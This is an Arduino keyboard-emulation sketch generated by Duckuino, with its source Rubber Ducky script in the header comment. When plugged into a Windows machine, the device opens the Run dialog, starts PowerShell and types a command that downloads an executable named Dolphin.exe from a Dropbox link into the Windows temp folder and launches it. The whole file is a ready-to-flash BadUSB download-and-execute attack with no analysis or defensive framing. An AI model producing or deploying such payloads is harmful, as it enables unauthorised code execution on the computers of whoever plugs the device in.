/**
 * Made with Duckuino, an open-source project.
DELAY 500
GUI r
DELAY 500
STRING powershell
DELAY 150
ENTER
DELAY 1500
STRING (New-Object Net.WebClient).DownloadFile("https://www.dropbox.com/s/36f22yinvsehf57/Dolphin.exe?dl=1","C:\Windows\Temp\Dolphin.exe");Start-Process ("C:\Windows\Temp\Dolphin.exe\")
DELAY 500
ENTER
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("powershell"));

  delay(150);
  typeKey(KEY_RETURN);

  delay(1500);
  Keyboard.print(F("(New-Object Net.WebClient).DownloadFile(\"https://www.dropbox.com/s/36f22yinvsehf57/Dolphin.exe?dl=1\",\"C:\\Windows\\Temp\\Dolphin.exe\");Start-Process (\"C:\\Windows\\Temp\\Dolphin.exe\\\")"));

  delay(500);
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
